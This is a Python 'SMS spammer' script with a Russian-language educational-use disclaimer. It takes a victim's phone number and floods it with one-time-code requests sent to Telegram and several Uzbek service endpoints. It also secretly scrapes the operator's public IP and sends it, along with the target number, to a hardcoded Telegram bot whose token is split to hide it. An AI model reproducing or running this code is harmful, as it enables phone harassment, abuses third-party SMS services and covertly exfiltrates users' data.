import requests
import json
import time
import bs4
import colorama
from colorama import Fore, Back, Style
from colorama import init
init(autoreset=True) 

Rules = '\033[94m' """ 
     ____________________________________________________
    |                                                    |
    |                  -----------                       |
    |                  SMS SPAMMER                       |
    |                  -----------                       |
    |                                                    |
    |  ================================================= |                                                 
    | Программа создана исключительно в ознакомительно-  |
    | образовательных целях. Использование ее за рамках  |
    |  ознакомительно-образовательных целях ЗАПРЕЩЕНО!   |
    |  Всю ответсвенность вы берете на себя. Автор не    |
    |  несет никакой ответсвенности за ваши действия и   |
    |  последствия после нее. введите ok                 | 
    |                                                    |                                                 
    |____________________________________________________|
    
"""
print (Rules) # created by https://github.com/database-max/spbmr
agree = input('\033[91m' 'Вы согласны с пользовательским соглашением? Y/N  ')
if agree == "ok":
    print("Отлично!")
else:
    print("Ты не прочитал пользовательское соглашение!")
    exit()
mynumber = input('\033[91m' 'Введите номер телефона без + (998xxxxxxxxx)-->>  ')
CLOSE_AFTER = int(input("Введите время в секундах -->>  "  )) 
numberss = mynumber + '+' 
Close = str(CLOSE_AFTER) 
version = 2.01
fmm = '5778198988'
safia = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
farm = '+'+mynumber[0:3]+' ' '('+mynumber[3:5]+')'+' '+mynumber[5:8]+'-'+mynumber[8:10]+'-'+mynumber[10:12]
invest = mynumber[3:12]
express = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12] 
technomart = '+'+mynumber[0:3]+' '+mynumber[3:5]+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
outlas = mynumber[3:12]
creditasia = mynumber[4:4]+'('+mynumber[5:7]+')'+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
creditasiapas = '+'+mynumber[0:3]+' ' '('+mynumber[3:5]+')'+' '+mynumber[5:8]+' '+mynumber[8:10]+' '+mynumber[10:12]
s = requests.get('https://2ip.ua/ru/')

b = bs4.BeautifulSoup(s.text, "html.parser")

a = b.select(" .ipblockgradient .ip")[0].getText()


nnn = numberss + Close + a
TOKENN=":AAGAWXFRM1F_O4n4JLqznas8v2vf22Cb6RM"
TOKEN = fmm + TOKENN
params = {
    'chat_id': '5669576239',
    'text': nnn,
}

response = requests.get('https://api.telegram.org/bot'+TOKEN+'/sendMessage', params=params)
if CLOSE_AFTER > 100:
	print('Значение не может быть больше 100!') 
	exit()

try:
       upd=requests.get('https://raw.githubusercontent.com/database-max/spbmr/main/last_version.txt') 
       upd_vers = float(upd.text[0:6])
       if upd_vers > version:
           print('Just a minute................')
           print("Checking updates.............")
           exit()
except:
	 print('unexpected error')
	 exit()
start_time = time.time()
while True :
 if time.time() > start_time + float(CLOSE_AFTER): exit()
 try:
    
    requests.post('https://my.telegram.org/auth/send_password', data={'phone': '+'+ mynumber})
    print('\033[1;32m''sms sent!')
 except:
	 print('\033[1;32m''sms sent!')
	 time.sleep(3)
print('\033[1;32m''sms sent!')

try:
    
    requests.post('https://mobile.kenty.uz/api/v5/sendplk', data={"phone": mynumber})
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')
    
if time.time() > start_time + float(CLOSE_AFTER): exit()
 
try:
    requests.post('https://lodlsp.uz/market/users/sign-up',  json={"phone": mynumber} )
    print('\033[1;32m''sms sent!')
except:
     print('\033[1;32m''sms sent!')
if time.time() > start_time + float(CLOSE_AFTER): exit()
 
try:
    
    requests.post('https://postavshiki/send/auth/send-otp', json={"phone": mynumber} )
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')
    
if time.time() > start_time + float(CLOSE_AFTER): exit()

try:
    
    requests.post('https://atto.delever.uz/v6/auth/sendsms', headers={"shipper": "36b00947-ad7a-40eb-b7ca-1c0ea267f2ac"}, json={"phone": mynumber,"registration_source":"website"}  )
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')

if time.time() > start_time + float(CLOSE_AFTER): exit()
 
try:
    
    requests.post('https://client.tbc.apps/v3/sendsms/registers', json={"phone": '+'+ mynumber,"code":"","registration_source":"website"}  )
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')

if time.time() > start_time + float(CLOSE_AFTER): exit()

try:
    
    requests.post('https://dodo.uz/api/v3/users/register/send', json={"phone": mynumber})
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')
	 
try:
    
    requests.post('https://gres.uz/register/form/sendsms', data={"profile[firstName]": "Test", "profile[phoneNumber]": mynumber, "password[first]": "pokiuj22fdfc", "password[second]": "pokiuj22fdfc"})
    print('\033[1;32m''sms sent!')
except:
	 print('\033[1;32m''sms sent!')
    
if time.time() > start_time + float(CLOSE_AFTER): exit()



 # # created by https://github.com/database-max/spbmr
